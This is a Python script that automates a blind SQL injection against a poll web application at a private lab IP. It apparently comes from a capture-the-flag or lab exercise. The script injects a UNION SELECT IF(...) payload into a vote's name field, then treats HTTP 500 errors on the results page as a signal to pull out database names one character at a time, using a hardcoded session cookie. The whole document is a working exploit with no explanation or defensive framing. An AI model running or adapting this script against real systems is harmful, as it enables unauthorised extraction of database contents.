import requests
import json

IP="10.0.1.207"
PAYLOAD = ""
LOOP=True
NUMBERLETTERS=1
CONTADOR=0

with open('letters-a-z.txt', 'r') as f:
    WORDLIST = [line.strip() for line in f.readlines()]
    NUMBERLINES = len(WORDLIST)

while LOOP==True:

    for PAY1 in WORDLIST:

        url1 = f'http://{IP}:8080/polls/1'
        headers1 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0',
            'Accept': '*/*',
            'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
            f'Referer': 'https://{IP}:8080/',
            'Content-Type': 'application/json',
            f'Origin': 'https://{IP}:8080',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        }

        payload1 = json.dumps({"selectedOptions": ["Python"],
            "name": f"'UNION SELECT IF((SELECT substring((SELECT DATABASE() LIMIT {CONTADOR},1),1,{NUMBERLETTERS})='{PAYLOAD}{PAY1}'),(SELECT table_name FROM information_schema.tables),'a')-- -'"
        })

        print(payload1)

        RESP1 = requests.post(url1, headers=headers1, data=payload1)

        response_json = json.loads(RESP1.text)
        VOTEID = response_json.get('vote_id', None)

        if VOTEID:

            url2 = f'http://{IP}:8080/polls/{VOTEID}/results'
            headers2 = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0',
                'Accept': '*/*',
                'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
                f'Referer': 'https://{IP}:8080/',
                'Connection': 'keep-alive',
                'Cookie': 'session=3a7b379d-2d5b-4e8f-ad9e-4df89227e387',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin'
            }
            RESP2 = requests.get(url2, headers=headers2)

            if RESP2.status_code == 500:
                PAYLOAD+=PAY1
                NUMBERLETTERS+=1
                break
        else:
            print(f"Não foi possível obter VOTEID para o payload {PAY1}")

        if PAY1==WORDLIST[NUMBERLINES-1]:
            CONTADOR+=1
            print(f"O banco de dados encontrado é:" + PAYLOAD)
            if PAYLOAD=='':
                LOOP=False
            else:
                PAYLOAD=''
                NUMBERLETTERS=1
